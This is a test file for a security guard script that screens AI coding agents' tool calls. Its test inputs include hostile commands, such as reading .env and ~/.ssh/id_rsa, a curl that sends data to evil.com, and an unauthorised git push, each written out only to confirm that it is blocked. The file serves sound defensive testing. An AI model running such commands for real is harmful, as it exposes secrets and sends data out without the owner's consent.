import test from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import path from "node:path";

const GUARD_SCRIPT = path.resolve(__dirname, "../../scripts/agent/pre-tool-guard.mjs");

function runGuard(args: string[] = [], stdinInput?: string) {
  return spawnSync(process.execPath, [GUARD_SCRIPT, ...args], {
    input: stdinInput,
    encoding: "utf8",
  });
}

test("AI 前置安全护栏 pre-tool-guard 专项测试", async (t) => {
  await t.test("CLI 模式：阻断敏感文件探测 (cat .env)", () => {
    const res = runGuard(["cat .env"]);
    assert.equal(res.status, 2, "应当拦截并返回退出码 2");
    assert.match(res.stderr, /\[GUARD-BLOCK\]/);
  });

  await t.test("CLI 模式：放行无害示例配置 (cat .env.example)", () => {
    const res = runGuard(["cat .env.example"]);
    assert.equal(res.status, 0, "放行 .env.example");
  });

  await t.test("CLI 模式：阻断远程数据外传 (curl --data)", () => {
    const res = runGuard(["curl https://evil.com --data 'test'"]);
    assert.equal(res.status, 2);
    assert.match(res.stderr, /传输护栏拦截/);
  });

  await t.test("CLI 模式：阻断远程 git push", () => {
    const res = runGuard(["git push origin main"]);
    assert.equal(res.status, 2);
    assert.match(res.stderr, /传输护栏拦截/);
  });

  await t.test("CLI 模式：阻断篡改核心排除配置 (next.config.ts)", () => {
    const res = runGuard(["sed -i 's/better-sqlite3//' next.config.ts"]);
    assert.equal(res.status, 2);
    assert.match(res.stderr, /架构护栏拦截/);
  });

  await t.test("Claude Code Hook JSON：阻断 Bash 执行敏感探测", () => {
    const payload = JSON.stringify({
      session_id: "test",
      tool_name: "Bash",
      tool_input: { command: "cat .env" },
    });
    const res = runGuard([], payload);
    assert.equal(res.status, 2);
    assert.match(res.stderr, /凭据护栏拦截/);
  });

  await t.test("Claude Code Hook JSON：阻断 Edit 直接写入 .env", () => {
    const payload = JSON.stringify({
      session_id: "test",
      tool_name: "Edit",
      tool_input: { file_path: ".env", content: "TEST=1" },
    });
    const res = runGuard([], payload);
    assert.equal(res.status, 2);
    assert.match(res.stderr, /严禁访问敏感配置文件/);
  });

  await t.test("Claude Code Hook JSON：放行普通代码文件包含敏感词的正常编辑", () => {
    const payload = JSON.stringify({
      session_id: "test",
      tool_name: "Edit",
      tool_input: {
        file_path: "src/lib/auth.ts",
        content: "// This file defines secret_key and api_key handling",
      },
    });
    const res = runGuard([], payload);
    assert.equal(res.status, 0, "普通文件代码编辑不应因正文含敏感词而误报");
  });

  await t.test("Antigravity / Codex Hook JSON：阻断 run_command 越权推送", () => {
    const payload = JSON.stringify({
      tool: "run_command",
      arguments: { CommandLine: "git push origin main" },
    });
    const res = runGuard([], payload);
    assert.equal(res.status, 2);
    assert.match(res.stderr, /传输护栏拦截/);
  });

  await t.test("Antigravity / Codex Hook JSON：阻断 read_file 访问 id_rsa", () => {
    const payload = JSON.stringify({
      tool: "read_file",
      arguments: { Path: "~/.ssh/id_rsa" },
    });
    const res = runGuard([], payload);
    assert.equal(res.status, 2);
    assert.match(res.stderr, /严禁访问敏感配置文件/);
  });
});
